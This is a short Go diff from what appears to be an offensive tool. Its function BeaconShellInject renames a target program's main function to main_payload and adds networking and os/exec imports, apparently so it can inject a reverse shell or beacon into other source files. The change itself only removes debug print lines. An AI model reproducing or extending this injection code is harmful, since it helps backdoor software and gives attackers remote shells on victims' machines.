@@ -31,7 +31,6 @@ func BeaconShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 		// Изменение имени исходной функции main
 		if strings.HasPrefix(line, "func main") {
 			line = strings.Replace(line, "func main", "func main_payload", 1)
-			fmt.Println("main found and replaced.")
 		}
 
 		// Проверяем, начинаем ли мы секцию импорта
@@ -57,14 +56,12 @@ func BeaconShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 			return
 		}
 	*/
-	fmt.Println(len(lines))
 
 	// Проверка и добавление необходимых импортов
 	requiredImports := []string{"\"io\"", "\"net\"", "\"os/exec\""}
 	for _, reqImport := range requiredImports {
 		if !isImportContains(imports, reqImport) {
 			new_imports = append(new_imports, reqImport)
-			fmt.Printf("Импорт %s добавлен.\n", reqImport)
 		}
 	}
 
